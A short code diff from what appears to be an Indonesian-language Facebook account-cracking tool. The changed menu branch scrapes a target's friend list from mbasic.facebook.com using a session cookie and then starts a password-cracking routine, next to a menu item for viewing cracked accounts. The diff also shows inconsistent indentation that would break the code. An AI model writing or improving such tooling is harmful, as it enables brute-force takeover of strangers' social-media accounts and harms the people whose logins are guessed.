@@ -154,10 +154,12 @@ class Main:
 		print(" [02]. lihat akun hasil crack")
 		print(f" [{M}00{N}]. logout (hapus login)")
 		ask = input("\n [?] pilih : ")
-		elif ask in["1","01"]:
+               elif ask in["1","01"]:
 			print (" [*] isi 'me' jika ingin crack dari daftar teman")
 			user = input(" [*] masukan id atau username : ")
-			self.publik(user,token,cookie)
+			if user in["Me","me"]:
+				user = Dump(cookie).GetUser()
+			Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
 			Crack().atursandi()
 		elif ask in["0","00"]:
 			try:os.remove("cookie.txt")
